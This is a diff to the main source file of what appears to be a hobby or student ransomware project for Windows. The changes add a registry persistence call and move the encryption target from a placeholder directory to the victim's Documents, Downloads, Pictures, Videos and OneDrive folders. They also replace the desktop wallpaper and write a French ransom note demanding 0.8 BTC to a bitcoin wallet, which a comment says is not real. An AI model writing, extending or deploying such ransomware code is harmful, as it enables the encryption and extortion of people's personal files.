+++ rware/Source.cpp
@@ -1,28 +1,22 @@
 #include <iostream>
+#include <fstream>
 #include <Windows.h>
 #include "strsafe.h"
 #include <ShlObj.h>
+#include "persistence.h"
+#include "encrypt.h"
 
-//TODO ; finish persistence method
-
-
-
-
-bool traverse(LPCWSTR targetDir, HCRYPTKEY clé,int nLevel = 0);
-HCRYPTKEY keyimport();
-//int checkForRegkey();
-
-
-//Main
 
 int main() {
 
-	//int checkForRegkey();
-	LPCWSTR targetDirs[] = { L"\\fakedir" };
+	//checkForRegkey();
+	setRegkey();
+	LPCWSTR targetDirs[] = { L"\\Documents",L"Downloads",L"Images",L"Videos",L"Pictures",L"OneDrive"};
 	LPWSTR userDir;
 	SHGetKnownFolderPath(FOLDERID_Profile,0,NULL,&userDir);
 
 	HCRYPTKEY key = keyimport();
+
 
 	for (LPCWSTR singledir : targetDirs) {
 		
@@ -30,6 +24,15 @@ int main() {
 		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
 		traverse(absoluteDirPath,key);
 	}
+	
+
+	LPCWSTR wallpapePath = L"C:\\Windows\\Temp\\kekchose.txt";
+	bool res = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpapePath, SPIF_UPDATEINIFILE);
+	std::ofstream myfile(L"C:\\Users\\placeholder\\Desktop\\ransom note.txt");
+	//It's not a real wallet ofc
+	myfile << "Vos fichiers encryptés !!! Payez la rançon 0.8 BTC sur wallet : 19BY2XCgbDe7WtTVbTyzM92R3LYr6VitWK" << std::endl;
+	myfile.close();
+
 
 	return 0;
 }
